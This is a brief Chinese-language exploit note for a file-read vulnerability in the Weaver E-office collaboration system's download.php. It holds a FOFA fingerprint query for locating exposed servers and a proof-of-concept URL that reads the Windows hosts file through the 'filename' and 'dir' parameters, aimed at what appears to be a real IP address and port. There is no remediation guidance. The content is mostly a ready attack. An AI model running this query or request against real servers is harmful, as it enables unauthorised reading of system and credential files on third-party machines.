# 泛微E-office协同办公系统 download.php 文件 filename 参数文件读取漏洞

    ## fofa

```
((header="general/login/index.php" || body="/general/login/view//images/updateLoad.gif" || (body="szFeatures" && body="eoffice") || header="Server: eOffice") && body!="Server: couchdb") || banner="general/login/index.php"
```

## poc

```
http://122.224.27.187:8082/general/file_folder/file_new/neworedit/download.php?filename=hosts&dir=C:\Windows\System32\drivers\etc\
```
